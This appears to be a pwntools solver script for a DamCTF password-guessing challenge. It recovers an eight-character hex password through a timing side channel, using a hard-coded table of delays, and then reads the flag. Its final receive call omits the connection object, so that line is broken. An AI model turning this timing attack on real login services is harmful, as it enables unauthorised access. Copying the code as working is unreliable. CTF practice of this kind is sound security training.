from pwn import *
import time
import re


times = []

def guess(ind, c="f"):
    start = time.time()
    r.sendline(c)
    line = r.recvline()
    end = time.time()
    times.append(end - start)
    print("TIME on guess", ind, ": ", end - start)
    print("\n\n")
    print(line.decode())

def lookup_char(t):
    p = t
    t = re.match(r'\d+.\d{1}', str(t)).group(0)
    t = float(t)

    if t == 0.2 and p > 0.2035:
        return "0"
    if t == 0.6 or t == 0.4:
        return "1"
    if t == 0.8:
        return "2"
    if t == 1.2:
        return "3"
    if t == 1.4:
        return "4"
    if t == 1.8:
        return "5"
    if t == 2.0 or t == 1.9:
        return "6"
    if t == 2.4:
        return "7"
    if t == 2.6 or t == 2.5:
        return "8"
    if t == 2.8:
        return "9"
    if t == 3.2:
        return "a"
    if t == 3.4:
        return "b"
    if t == 3.8 or t == 3.7:
        return "c"
    if t == 4.0:
        return "d"
    if t == 4.5:
        return "e"
    if (t == 0.2 and p < 0.2035) or t == 0.1:
        return "f"
    return "UNKNOWN"

r = remote("chals.damctf.xyz", 30318)

line = r.recvuntil("Password guessing Trial 1\n")
print(line.decode())

# Timing Attack
ind = 0
line = r.recvline()
print(line.decode())
for x in range(8):
    guess(ind)
    ind += 1

# Utilize Timing Data
ind = 0
line = r.recvline()
print(line.decode())
for x in range(8):
    g = lookup_char(times[ind])
    guess(ind, g)
    ind += 1

# Print Flag
line = recvuntil("}")
print(line.decode())

r.close()